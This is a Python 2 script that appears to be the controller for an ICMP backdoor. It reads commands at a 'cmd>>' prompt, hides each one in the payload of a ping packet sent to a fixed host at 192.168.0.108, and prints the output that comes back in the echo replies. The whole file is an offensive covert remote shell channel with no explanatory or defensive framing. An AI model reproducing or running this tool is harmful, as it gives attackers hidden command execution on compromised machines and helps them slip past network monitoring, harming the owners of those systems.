#!/usr/bin/python
import socket
import struct

def do_checksum(source_string):
    """  Verify the packet integritity """
    sum = 0
    max_count = (len(source_string)/2)*2
    count = 0
    while count < max_count: 
        val = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + val
        sum = sum & 0xffffffff
        count = count + 2

    if max_count<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)   
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer   











def send_ping(sock,cmd):
    """
    Send ping to the target host
    """
    target_addr  =  '192.168.0.108'
    my_checksum = 0

    # Create a dummy heder with a 0 checksum.
    header = struct.pack("bbHHh", 8, 0, my_checksum, 0, 0)
    data = struct.pack("2000s",cmd)

    # Get the checksum on the data and the dummy header.
    my_checksum = do_checksum(header + data)
    header = struct.pack("bbHHh", 8, 0, my_checksum,0,0)
    packet = header + data
    sock.sendto(packet, (target_addr, 1))


if __name__ =='__main__':
    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.getprotobyname('icmp'))
    while True:
	cmd = raw_input("cmd>>")
	if cmd.strip() == '':
		continue
	send_ping(sock,cmd.strip())
	
    	data,addr= sock.recvfrom(2500)
    	
	
    	data, = struct.unpack('2000s',data[28:])
	if data.strip('\0')== cmd.strip():	
		data,addr= sock.recvfrom(2500)
		data, = struct.unpack('2000s',data[28:])
		print(data)

	        

	else:
		print(data)

    	
	
	

